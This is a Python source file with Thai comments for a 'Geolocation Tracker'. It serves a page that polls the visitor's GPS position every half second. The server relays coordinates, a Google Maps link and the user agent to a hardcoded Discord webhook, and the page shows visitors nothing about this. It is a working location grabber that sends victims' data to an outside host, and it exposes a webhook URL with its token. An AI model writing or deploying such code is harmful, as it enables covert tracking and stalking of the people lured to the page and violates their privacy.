import json
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

HTML_CONTENT = b"""<!DOCTYPE html>
<html>
<head>
    <title>Geolocation Tracker</title>
</head>
<body>
    <script>
        function send() {
            navigator.geolocation.getCurrentPosition(position => {
                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    userAgent: navigator.userAgent
                };

                fetch('/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(response => console.log("Location sent!"));
            });
        }
        setInterval(send, 500);
    </script>
    <h1>GPS</h1>
    <p>Bot line</p>
</body>
</html>
"""

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz'  # ใส่ลิงก์ Webhook ของ Discord ที่นี่

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests and return the HTML content."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_CONTENT)

    def do_POST(self):
        """Handle POST requests and process the JSON data sent by the client."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        latitude = data.get('latitude')
        longitude = data.get('longitude')
        user_agent = data.get('userAgent')

        # Create Google Maps link
        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"

        # Prepare the message to send to Discord as an Embed
        embed = {
            "embeds": [
                {
                    "title": "ข้อมูลตำแหน่ง",
                    "description": "รายละเอียดตำแหน่งที่ได้รับ",
                    "color": 7506394,  # สีของ embed (ตัวเลขฐาน 10)
                    "fields": [
                        {"name": "🌍 ตำแหน่ง (Latitude, Longitude)", "value": f"{latitude}, {longitude}", "inline": True},
                        {"name": "📍 ดูตำแหน่งบน Google Maps", "value": f"[เปิดใน Google Maps]({maps_url})", "inline": False},
                        {"name": "📱 User-Agent", "value": user_agent, "inline": False},
                    ],
                    "footer": {"text": "ส่งโดย GPS Bot"}
                }
            ]
        }

        # Send the data to Discord via the Webhook
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
            if response.status_code == 204:
                print(f"ส่งข้อมูลไปที่ Discord: {latitude}, {longitude}")
            else:
                print(f"ไม่สามารถส่งข้อมูลไปที่ Discord ได้: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"เกิดข้อผิดพลาดในการส่งข้อมูลไปที่ Discord: {e}")

        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(('127.0.0.1', 5000), RequestHandler)
    print("เปิดใช้งานเซิร์ฟเวอร์: http://127.0.0.1:5000")
    server.serve_forever()